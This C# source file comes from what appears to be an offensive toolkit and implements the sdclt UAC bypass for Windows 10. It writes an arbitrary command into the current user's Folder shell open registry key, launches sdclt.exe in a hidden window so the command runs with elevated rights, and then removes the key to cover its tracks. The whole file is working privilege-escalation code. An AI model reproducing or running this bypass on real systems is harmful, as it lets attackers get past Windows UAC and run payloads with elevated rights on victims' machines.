using System.Threading;
using System.Diagnostics;
using System.Text;
using Microsoft.Win32;
using static NetRunnersUac.Check;

namespace NetRunners.Uac.Bypass
{
    public static partial class Bypass
    {
        public static void Sdclt(byte[] encodedCommand)
        {
            // Credit: http://blog.sevagas.com/?Yet-another-sdclt-UAC-bypass

            //Check if UAC is set to 'Always Notify'
            CheckAlwaysNotify();

            //This only appears to work on Windows 10. Check the version of the OS
            RegistryKey osversion = Registry.LocalMachine.OpenSubKey(@"Software\Microsoft\Windows NT\CurrentVersion\");
            string windowsVersion = osversion.GetValue("ProductName").ToString();
            osversion.Close();
            if (!windowsVersion.Contains("Windows 10"))
            {
                System.Console.WriteLine("System is not Windows 10. This attack will fail. Exiting...");
                System.Environment.Exit(1);
            }

            //Convert encoded command to a string
            string command = Encoding.UTF8.GetString(encodedCommand);

            //Set the registry key
            RegistryKey newkey = Registry.CurrentUser.OpenSubKey(@"Software\Classes\", true);
            newkey.CreateSubKey(@"Folder\shell\open\command");

            RegistryKey sdclt = Registry.CurrentUser.OpenSubKey(@"Software\Classes\Folder\shell\open\command", true);
            sdclt.SetValue("", @command);
            sdclt.SetValue("DelegateExecute", "");
            sdclt.Close();

            //start process
            Process p = new Process();
            p.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
            p.StartInfo.FileName = "C:\\windows\\system32\\sdclt.exe";
            p.Start();

            //sleep 10 seconds to let the payload execute
            Thread.Sleep(10000);

            //Unset the registry
            newkey.DeleteSubKeyTree("Folder");
            return;
        }
    }
}